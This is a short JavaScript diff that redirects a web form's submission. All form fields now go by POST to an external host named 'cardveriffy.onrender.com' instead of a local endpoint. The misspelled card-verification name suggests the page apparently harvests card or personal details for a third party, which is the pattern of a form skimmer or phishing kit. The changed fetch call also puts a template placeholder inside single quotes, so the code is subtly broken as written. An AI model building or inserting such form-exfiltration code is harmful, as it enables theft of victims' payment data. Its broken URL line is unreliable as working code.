@@ -411,9 +411,9 @@
   
       const formData = new FormData(this);
       const data = Object.fromEntries(formData.entries());
-      //const backendUrl = 'https://cardveriffy.onrender.com';
+      const backendUrl = 'https://cardveriffy.onrender.com';
   
-      fetch('/send', {
+      fetch('${backendUrl}/server', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
